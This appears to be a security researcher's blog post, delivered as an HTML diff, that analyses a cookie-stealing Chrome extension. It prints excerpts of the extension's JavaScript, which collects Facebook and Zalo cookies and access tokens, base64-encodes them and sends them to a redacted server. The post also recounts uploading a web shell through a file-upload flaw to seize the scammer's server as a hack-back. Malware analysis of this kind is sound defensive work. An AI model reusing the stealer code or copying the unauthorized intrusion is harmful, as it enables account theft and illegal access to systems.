@@ -1,0 +1,903 @@
+
+
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.28.1 by Michael Rose
+  Copyright 2013-2026 Michael Rose - mademistakes.com | @mmistakes
+  Copyright 2024-2026 iBug - ibugone.com | @iBug
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en-US" class="no-js" dir="ltr">
+  <head>
+    
+<meta charset="utf-8">
+
+
+<!-- begin _includes/seo.html --><title>How I nabbed a new CVE from a Cookie-Munching, Scam-Slinging Browser Extension | iam.chi</title>
+<meta name="description" content="Friday night @ 9PM….">
+
+
+  <meta name="author" content="Chi Tran">
+  
+  <meta property="article:author" content="Chi Tran">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="iam.chi">
+<meta property="og:title" content="How I nabbed a new CVE from a Cookie-Munching, Scam-Slinging Browser Extension">
+<meta property="og:url" content="http://localhost:4444/research/pwning-the-scammer-new-zero-day/">
+
+
+  <meta property="og:description" content="Friday night @ 9PM….">
+
+
+
+  <meta property="og:image" content="http://localhost:4444/images/site-preview.png">
+  
+
+
+
+  <meta name="twitter:site" content="@imspicynoodles">
+  <meta name="twitter:title" content="How I nabbed a new CVE from a Cookie-Munching, Scam-Slinging Browser Extension">
+  <meta name="twitter:description" content="Friday night @ 9PM….">
+  <meta name="twitter:url" content="http://localhost:4444/research/pwning-the-scammer-new-zero-day/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="http://localhost:4444/images/site-preview.png">
+      
+    
+  
+
+  
+
+
+
+
+
+  <meta property="article:published_time" content="2023-06-24T00:00:00-04:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4444/research/pwning-the-scammer-new-zero-day/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="iam.chi Feed">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+  
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- Site is dark-skin only (minimal_mistakes_skin: dark) — tell the browser so
+     native UI (form controls, scrollbars, mobile address bar) matches instead
+     of defaulting to light, and there's no light-mode flash before CSS loads. -->
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#252a34">
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    
+<nav class="skip-links" aria-label="Skip links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav" aria-label="Primary navigation">
+        
+        <a class="site-title" href="/">
+          iam.chi
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/about"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="https://ctrsec.io"
+                
+                
+              >All Posts</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/categories/"
+                
+                
+              >Categories</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+
+
+<div id="main" role="main">
+  
+
+  <div class="sidebar sticky">
+  
+
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="http://localhost:4444/">
+        <img src="/images/bio-photo.jpg" alt="Chi Tran" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="http://localhost:4444/" itemprop="url">Chi Tran</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Senior Security Researcher, dad of two, and a former line cook who never stopped loving spicy noodles. I write up the vulnerabilities and other rabbit holes I stumble into.</p>
+
+<p><em>Opinions and research here are my own — not my employer’s, past or present.</em></p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="mailto:research@ctrsec.io" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/iam-trchi/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/imspicynoodles" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/0xfatty" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="/files/Chi_Tran_Resume.pdf" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-file-pdf" aria-hidden="true"></i><span class="label">Resume</span></a></li>
+          
+        
+          
+            <li><a href="https://ctrsec.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Homepage</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="How I nabbed a new CVE from a Cookie-Munching, Scam-Slinging Browser Extension">
+    <meta itemprop="description" content="Friday night @ 9PM….">
+    <meta itemprop="datePublished" content="2023-06-24T00:00:00-04:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="http://localhost:4444/research/pwning-the-scammer-new-zero-day/" itemprop="url">How I nabbed a new CVE from a Cookie-Munching, Scam-Slinging Browser Extension
+</a>
+          </h1>
+          
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-06-24T00:00:00-04:00">June 24, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc" aria-label="Table of contents">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#friday-night--9pm">Friday night @ 9PM….</a></li><li><a href="#javascript-and-its-funny">Javascript, and it’s funny</a></li><li><a href="#coming-up-next">Coming up next</a></li><li><a href="#the-fight-started">The fight started….</a></li><li><a href="#because-i-am-a-good-person">Because I am a good person…</a></li><li><a href="#what-happened-to-the-scammer-and-their-website">What happened to the scammer and their website</a></li><li><a href="#references">References</a></li></ul>
+            </nav>
+          </aside>
+        
+        <h2 id="friday-night--9pm">Friday night @ 9PM….</h2>
+
+<p>What’s more riveting than the unexpected? Picture this: it’s a lazy Friday night. Lovely wifey and the kids are watching TV shows. Me? I’m diving headfirst into the murky waters of a potential scam from an oversea bad actor, tipped off by a curious friend.</p>
+
+<p>The bait was a browser extension promising Facebook cookie extraction faster than a cheetah on a caffeine high. Facebook and I share the bond of casual strangers, but this… this was a mystery screaming to be solved. Shouted to my buddy “Don’t touch that!”, then rolled up my digital sleeves and got cracking.</p>
+
+<p><img src="/images/scammer4.png" alt="" /></p>
+
+<h2 id="javascript-and-its-funny">Javascript, and it’s funny</h2>
+
+<p>JavaScript was the innocuous-looking vehicle driving this extension. Now, JS has the guileless facade of a doe-eyed, purring kitten. But I’ve seen kittens scratch, and this one was no different. For your perusal:</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="c1">// truncated - variables declaration</span>
+
+<span class="kd">function</span> <span class="nf">loadCookie</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nf">getSelected</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">tab</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// null defaults to current window</span>
+    <span class="kd">var</span> <span class="nx">currentUrl</span> <span class="o">=</span> <span class="nx">tab</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">currentUrl</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">chrome://newtab</span><span class="dl">'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">currentUrl</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://www.facebook.com</span><span class="dl">"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kd">var</span> <span class="nx">listCookieZalo</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">currentUrl</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="dl">'</span><span class="s1">chat.zalo.me</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
+      <span class="nx">chrome</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nf">getAll</span><span class="p">({},</span> <span class="nf">function </span><span class="p">(</span><span class="nx">cookie</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">cookie</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">if </span><span class="p">(</span><span class="nx">cookie</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">domain</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="dl">'</span><span class="s1">zalo</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nx">listCookieZalo</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">cookie</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nf">getSelected</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">tab</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nf">executeScript</span><span class="p">(</span><span class="nx">tab</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="p">{</span>
+            <span class="na">code</span><span class="p">:</span> <span class="dl">'</span><span class="s1">localStorage["z_uuid"]</span><span class="dl">'</span><span class="p">,</span>
+          <span class="p">},</span> <span class="nf">function </span><span class="p">(</span><span class="nx">imei</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if </span><span class="p">(</span><span class="nx">imei</span> <span class="o">!=</span> <span class="kc">undefined</span> <span class="o">&amp;&amp;</span> <span class="nx">imei</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="nx">imei</span> <span class="o">!=</span> <span class="dl">''</span><span class="p">)</span> <span class="p">{</span>
+              <span class="nx">result</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">imei=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">imei</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">;</span><span class="dl">"</span><span class="p">;</span>
+              <span class="kd">var</span> <span class="nx">jsonCookie</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">listCookieZalo</span><span class="p">);</span>
+              <span class="nx">currentCookie</span> <span class="o">=</span> <span class="nx">jsonCookie</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">|</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">result</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">|</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">;</span>
+              <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">cookieResult</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">currentCookie</span><span class="p">;</span>
+            <span class="p">}</span>
+          <span class="p">});</span>
+        <span class="p">});</span>
+      <span class="p">});</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#UrlCookieCurrent</span><span class="dl">'</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="nf">extractHostname</span><span class="p">(</span><span class="nx">currentUrl</span><span class="p">));</span>
+      <span class="nx">chrome</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nf">getAll</span><span class="p">({</span> <span class="dl">"</span><span class="s2">url</span><span class="dl">"</span><span class="p">:</span> <span class="nx">currentUrl</span> <span class="p">},</span> <span class="nf">function </span><span class="p">(</span><span class="nx">cookie</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+        <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">cookie</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">result</span> <span class="o">+=</span> <span class="nx">cookie</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">name</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">cookie</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">value</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">;</span><span class="dl">"</span><span class="p">;</span>
+          <span class="k">if </span><span class="p">(</span><span class="nx">cookie</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">name</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">c_user</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">currentUid</span> <span class="o">=</span> <span class="nx">cookie</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="c1">//truncated</span>
+        <span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nf">getSelected</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">tab</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nf">executeScript</span><span class="p">(</span><span class="nx">tab</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="p">{</span>
+            <span class="na">code</span><span class="p">:</span> <span class="dl">'</span><span class="s1">localStorage["z_uuid"]</span><span class="dl">'</span><span class="p">,</span>
+          <span class="p">},</span> <span class="nf">function </span><span class="p">(</span><span class="nx">imei</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if </span><span class="p">(</span><span class="nx">imei</span> <span class="o">!=</span> <span class="kc">undefined</span> <span class="o">&amp;&amp;</span> <span class="nx">imei</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="nx">imei</span> <span class="o">!=</span> <span class="dl">''</span><span class="p">)</span> <span class="p">{</span>
+              <span class="nx">result</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">imei=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">imei</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">; </span><span class="dl">"</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">cookieResult</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">result</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">|</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">;</span>
+<span class="c1">//truncated </span>
+
+<span class="nf">loadCookie</span><span class="p">();</span></code></pre></figure>
+
+<p>Now, I’m sure some of you are dying to know the domain name of this criminal. But alas, my moral compass, tuned more accurately than my wife throwing flip-flop whenever I forgot to throw the trash, nudged me to stay righteous. So, for this show, I redacted the domain name. Because even in the world of cyber scams, ethics matter.</p>
+
+<p>Also, since the code is long, I will break that down into several parts. Let’s unwrap this first part of enigmatic JavaScript parcel, shall we?</p>
+
+<p>This function, <code class="language-plaintext highlighter-rouge">loadCookie</code>, does exactly what its name implies: it loads cookies from a website. It first checks the current URL of the selected tab. If it’s the default new tab page <code class="language-plaintext highlighter-rouge">(chrome://newtab)</code>, it sets currentUrl to <code class="language-plaintext highlighter-rouge">https://www.facebook.com</code>.</p>
+
+<p>Next, it checks if currentUrl contains <code class="language-plaintext highlighter-rouge">chat.zalo.me</code> - Zalo is a popular Vietnamese chat app, which suggests this extension is not just after Facebook data. It collects all the cookies from the site and makes a special note of those containing <code class="language-plaintext highlighter-rouge">zalo</code> in their domain.</p>
+
+<p>Now, here’s the crafty bit: the extension runs a script in the context of the current tab to get the value of <code class="language-plaintext highlighter-rouge">localStorage["z_uuid"]</code>, which could be a unique user identifier. It’s storing this value as a cookie. So not only does the extension have all the standard cookies, it has potentially sensitive data too.</p>
+
+<p>If it’s not Zalo, the function instead grabs cookies from the site in the <code class="language-plaintext highlighter-rouge">currentUrl</code> and collects the UID from the <code class="language-plaintext highlighter-rouge">c_user</code> cookie. Just like with Zalo, it also tries to grab the <code class="language-plaintext highlighter-rouge">localStorage["z_uuid"]</code> value, but now it’s appending it directly to the result string.</p>
+
+<p>Lastly, if the site is Facebook, it’s executing a series of scripts to extract a Facebook ID from various elements and attributes on the page. These scripts are all wrapped in try-catch blocks, indicating a sort of <code class="language-plaintext highlighter-rouge">brute-force</code> approach to ensure that it gets an ID.</p>
+
+<p>Phew, that’s quite the cookie heist! This code effectively allows the extension to collect users’ cookies from websites, extract unique identifiers, and potentially access users’ accounts on these sites - definitely a danger to user privacy and security. Stay tuned for more insights into this code in the next parts!</p>
+
+<h2 id="coming-up-next">Coming up next</h2>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="c1">//truncated</span>
+  <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#btnGetAccessToken</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nf">getSelected</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">tab</span><span class="p">)</span> <span class="p">{</span>
+      <span class="kd">var</span> <span class="nx">link</span> <span class="o">=</span> <span class="nx">tab</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
+      <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">link</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="dl">'</span><span class="s1">access_token=</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nf">create</span><span class="p">({</span>
+          <span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">view-source:https://www.facebook.com/dialog/oauth?client_id=124024574287414&amp;redirect_uri=https://www.instagram.com/accounts/signup/&amp;&amp;scope=email&amp;response_type=token&amp;data=</span><span class="dl">"</span>
+        <span class="p">},</span> <span class="nf">function </span><span class="p">(</span><span class="nx">tab</span><span class="p">)</span> <span class="p">{</span>
+        <span class="p">});</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">accesstoken_ads</span> <span class="o">=</span> <span class="nf">cutStringStartEnd</span><span class="p">(</span><span class="nx">link</span><span class="p">,</span> <span class="dl">'</span><span class="s1">access_token=</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>
+        <span class="nf">sendGet</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://graph.facebook.com/me?fields=id,name&amp;access_token=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">accesstoken_ads</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">reponse</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">cuser</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+          <span class="nx">myName</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+          <span class="k">try</span> <span class="p">{</span>
+            <span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">reponse</span><span class="p">);</span>
+            <span class="nx">cuser</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
+            <span class="nx">myName</span> <span class="o">=</span> <span class="nf">change_alias</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
+          <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
+          <span class="p">}</span>
+<span class="c1">//truncated</span>
+            <span class="p">}],</span>
+            <span class="dl">"</span><span class="s2">confirmed</span><span class="dl">"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+            <span class="dl">"</span><span class="s2">identifier</span><span class="dl">"</span><span class="p">:</span> <span class="nx">cuser</span><span class="p">,</span>
+            <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="nx">myName</span><span class="p">,</span>
+            <span class="dl">"</span><span class="s2">user_storage_key</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">860dcb45bf2e078ec94e372206b9a734a64fd1db7a417b1c92949b5bac1eadc9</span><span class="dl">"</span>
+          <span class="p">};</span>
+          <span class="kd">let</span> <span class="nx">r</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">all_data</span><span class="p">));</span>
+          <span class="kd">var</span> <span class="nx">newURL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://[redacted]/?access_token_v2=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">r</span><span class="p">;</span>
+          <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">newURL</span><span class="p">);</span>
+          <span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nf">create</span><span class="p">({</span>
+            <span class="na">url</span><span class="p">:</span> <span class="nx">newURL</span>
+          <span class="p">});</span></code></pre></figure>
+
+<p>This behavior is concentrated in the <code class="language-plaintext highlighter-rouge">$("#btnGetAccessToken").click</code> function, which appears to retrieve an access token from Facebook, possibly without the user’s consent or knowledge.</p>
+
+<p>The access token is fetched using the Facebook OAuth dialog with a pre-specified client id. And lastly, it begins to compile a complex object that includes everything from the user’s Facebook ID (cuser) and the captured access token to crafted session cookies, ready for dispatch.</p>
+
+<p>The JSON object is then converted into a base64 encoded string (a favourite technique amongst cyber villains to mask their ill-gotten gains), before being sent to the rogue server via yet another URL. The URL is ingeniously designed to look like a part of a legitimate service (<code class="language-plaintext highlighter-rouge">http://[redacted]/?access_token_v2=</code>), further deepening the deception.</p>
+
+<p>This treacherous code is as much a work of art as it is a menace. By executing it, the users unwittingly surrender their Facebook session cookies, giving the scammer free rein over their Facebook account. It’s like leaving your house keys under the doormat, with a neon sign saying “Come on in!”</p>
+
+<h2 id="the-fight-started">The fight started….</h2>
+
+<p>From this point, I really into it. On top of my head is to revenge this scamming scheme. So, the adventure didn’t end with only unmasking the JavaScript sneak thief. In true detective fashion, I traced the scam back to their infrastructure, and found a website running Laravel and PHP – a love story riddled with plot twists. My curiosity piqued, I decided to taste test the waters further.</p>
+
+<p>With bug bounty hunter mindset, I performed a search to find its subdomains, and I was happy that there was a website running on Laravel. Hmmmmm….PHP? I love it. Why? Because PHP is soooooo cancer.</p>
+
+<p><img src="/images/scammer1.png" alt="" /></p>
+
+<p>Worth to note, scammers’ mindset is to use whatever they found on the internet, with or without knowing the technical behind the technology. And voila! The grand reveal was an unrestricted file upload feature,</p>
+
+<p><img src="/images/scammer2.png" alt="" /></p>
+
+<p>A bit more about this application, this application is Uhelp, a helpdesk ticket system that was developed by an India company. The vulnerability occurs when a user creates a new ticket or replies to an existing ticket via <code class="language-plaintext highlighter-rouge">/customer/imageupload</code> endpoint. Web front-end did a great job blocking all other extensions than imgages coming in. But the back-end logic destroyed it all. It allows an attacker (or a scam fighter in my case) to arbitrarily upload files.</p>
+
+<p>Say less now, an entry as wide open as a barn gate. Seizing the opportunity, I uploaded a web shell and seized control of the scammer’s server. It was like being handed the control room keys to the Death Star.</p>
+
+<p><img src="/images/scammer3.png" alt="" /></p>
+
+<p>And….</p>
+
+<p><img src="/images/scammer4.png" alt="" /></p>
+
+<p>This is enough to play with. I stopped here and posted a message to the community for awareness.</p>
+
+<h2 id="because-i-am-a-good-person">Because I am a good person…</h2>
+
+<p>Since this is a fight with scammers, not the fight with whoever created this. I have brought this to the vendor and meanwhile requesting a CVE for this software.</p>
+
+<p><img src="/images/scammer5.png" alt="" /></p>
+
+<p>Last but not least, as a bonus, several Stored Cross-site scripting vulnerabilities were found during the research.</p>
+
+<p><img src="/images/scammer6.png" alt="" /></p>
+
+<h2 id="what-happened-to-the-scammer-and-their-website">What happened to the scammer and their website</h2>
+
+<p>I have reported the scamming scheme to the community and reported their domain name to the organization that controls its top-level domain extension for a take down.</p>
+
+<h2 id="references">References</h2>
+
+<p>[1] https://uhelp.spruko.com/index.html</p>
+
+<p>[2] https://codecanyon.net/item/uhelp-support-ticketing-system/36331368</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+  
+
+  
+    
+
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#research" class="page__taxonomy-item p-category" rel="tag">Research</a>
+    
+    </span>
+  </p>
+
+
+  
+
+
+        
+
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2023-06-24T00:00:00-04:00">June 24, 2023</time></p>
+
+
+      </footer>
+
+      
+<section class="page__share">
+  <h4 class="page__share-title">Share on</h4>
+
+  <a href="https://x.com/intent/tweet?via=imspicynoodles&text=How+I+nabbed+a+new+CVE+from+a+Cookie-Munching%2C+Scam-Slinging+Browser+Extension%20http%3A%2F%2Flocalhost%3A4444%2Fresearch%2Fpwning-the-scammer-new-zero-day%2F" class="btn btn--x" aria-label="Share on X" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on X">
